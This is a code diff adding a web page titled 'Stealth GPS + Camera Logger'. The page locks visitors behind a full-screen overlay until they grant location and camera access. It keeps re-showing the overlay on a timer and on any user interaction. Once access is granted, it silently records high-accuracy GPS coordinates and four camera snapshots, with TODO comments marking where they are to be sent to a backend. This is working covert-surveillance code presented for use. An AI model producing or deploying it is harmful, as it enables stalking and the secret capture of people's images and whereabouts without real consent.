@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Stealth GPS + Camera Logger</title>
+<style>
+  body, html {
+    margin: 0; padding: 0; height: 100%; font-family: Arial, sans-serif;
+    background: #111; color: #eee;
+  }
+  #blocker {
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.9);
+    color: white;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    font-size: 1.3rem;
+    text-align: center;
+    padding: 20px;
+    user-select: none;
+  }
+  #blocker button {
+    margin-top: 20px;
+    padding: 10px 25px;
+    font-size: 1.1rem;
+    background: #007bff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    color: white;
+  }
+  #info {
+    margin: 10px 0;
+  }
+</style>
+</head>
+<body>
+
+<div id="blocker" style="display:none;">
+  <div>
+    <p><strong>Permissions Required</strong></p>
+    <p id="blocker-message">This site needs location and camera access to work.</p>
+    <button id="retry-permissions">Allow Permissions</button>
+    <p style="margin-top:15px; font-size:0.9rem; opacity:0.7;">
+      If you denied permissions, please allow them in your browser settings and click the button above.
+    </p>
+  </div>
+</div>
+
+<script>
+(async () => {
+  const blocker = document.getElementById('blocker');
+  const blockerMessage = document.getElementById('blocker-message');
+  const retryBtn = document.getElementById('retry-permissions');
+
+  // Utility to check permission status for geolocation and camera
+  async function checkPermissions() {
+    let geoStatus = 'prompt';
+    let camStatus = 'prompt';
+
+    try {
+      const geoPerm = await navigator.permissions.query({name:'geolocation'});
+      geoStatus = geoPerm.state;
+    } catch {}
+
+    try {
+      const camPerm = await navigator.permissions.query({name:'camera'});
+      camStatus = camPerm.state;
+    } catch {}
+
+    return { geoStatus, camStatus };
+  }
+
+  // Show blocker overlay with message
+  function showBlocker(message) {
+    blockerMessage.textContent = message;
+    blocker.style.display = 'flex';
+  }
+  function hideBlocker() {
+    blocker.style.display = 'none';
+  }
+
+  // Request geolocation with Promise wrapper
+  function requestGeolocation() {
+    return new Promise((res, rej) => {
+      navigator.geolocation.getCurrentPosition(
+        position => res(position),
+        error => rej(error),
+        {enableHighAccuracy:true, maximumAge:0, timeout:10000}
+      );
+    });
+  }
+
+  // Request camera access
+  async function requestCamera() {
+    try {
+      // Request 4 snapshots from camera, will handle video stream for snapshots later
+      // For now just get media stream
+      const stream = await navigator.mediaDevices.getUserMedia({video:true});
+      // Immediately stop tracks to not keep camera open indefinitely
+      stream.getTracks().forEach(track => track.stop());
+      return true;
+    } catch (e) {
+      throw e;
+    }
+  }
+
+  // Main permission requesting logic
+  async function requestPermissions() {
+    try {
+      // Request Geolocation first
+      await requestGeolocation();
+
+      // Request camera next
+      await requestCamera();
+
+      return true;
+    } catch (e) {
+      return false;
+    }
+  }
+
+  // Persistent permission enforcement logic
+  async function enforcePermissions() {
+    const perms = await checkPermissions();
+    if (perms.geoStatus === 'granted' && perms.camStatus === 'granted') {
+      hideBlocker();
+      return true;
+    }
+
+    // Show blocker and instruct user to allow
+    showBlocker('This site requires Location and Camera permissions to proceed. Please allow them.');
+
+    // Add listener to retry button
+    retryBtn.onclick = async () => {
+      // Try to request permissions again
+      const allowed = await requestPermissions();
+      if (!allowed) {
+        // Check perms again
+        const newPerms = await checkPermissions();
+        if (newPerms.geoStatus === 'granted' && newPerms.camStatus === 'granted') {
+          hideBlocker();
+        } else {
+          showBlocker('Permissions denied. Please enable Location and Camera in your browser settings and retry.');
+        }
+      } else {
+        hideBlocker();
+      }
+    };
+
+    return false;
+  }
+
+  // On page load - keep checking permission status every 3 seconds, re-show blocker if denied
+  async function persistentCheck() {
+    const perms = await checkPermissions();
+    if (perms.geoStatus !== 'granted' || perms.camStatus !== 'granted') {
+      showBlocker('Permissions required to continue. Please allow Location and Camera access.');
+    } else {
+      hideBlocker();
+    }
+  }
+
+  // Initial enforce on load
+  let permsGranted = await enforcePermissions();
+
+  // Setup interval to keep checking permissions and block if revoked
+  setInterval(persistentCheck, 3000);
+
+  // Also listen for visibility change to retry prompt when user comes back
+  document.addEventListener('visibilitychange', async () => {
+    if (!document.hidden) {
+      await enforcePermissions();
+    }
+  });
+
+  // Optional: also listen for user interactions and re-try permissions if denied
+  ['click', 'keydown', 'mousemove', 'touchstart'].forEach(evt => {
+    window.addEventListener(evt, async () => {
+      const perms = await checkPermissions();
+      if (perms.geoStatus !== 'granted' || perms.camStatus !== 'granted') {
+        // Show blocker or try to re-request silently
+        showBlocker('Permissions required. Please allow Location and Camera access.');
+      }
+    });
+  });
+
+  // If permissions granted, proceed with main logic here (geolocation + snapshots)
+  if (permsGranted) {
+    startCaptureProcess();
+  } else {
+    // Wait for user to allow then start capture automatically
+    retryBtn.addEventListener('click', () => {
+      // After user clicks allow and permissions granted, start capture
+      setTimeout(() => {
+        checkPermissions().then(({geoStatus, camStatus}) => {
+          if (geoStatus === 'granted' && camStatus === 'granted') {
+            startCaptureProcess();
+          }
+        });
+      }, 1000);
+    });
+  }
+
+  // Your original capture logic here:
+  async function startCaptureProcess() {
+    hideBlocker();
+
+    // Example: get geolocation
+    try {
+      const pos = await requestGeolocation();
+      console.log('Position:', pos.coords.latitude, pos.coords.longitude);
+
+      // Capture 4 snapshots from camera
+      await captureFourSnapshots();
+
+      // TODO: send data to your backend
+    } catch(e) {
+      console.error('Capture failed:', e);
+    }
+  }
+
+  // Capture 4 snapshots from the camera
+  async function captureFourSnapshots() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+
+      for (let i = 0; i < 4; i++) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+        console.log(`Snapshot ${i+1}`, dataUrl);
+        // TODO: send dataUrl to backend
+        await new Promise(r => setTimeout(r, 1000)); // 1 sec between snapshots
+      }
+
+      stream.getTracks().forEach(track => track.stop());
+    } catch (e) {
+      console.error('Camera snapshot failed:', e);
+    }
+  }
+
+})();
+</script>
+
+</body>
+</html>
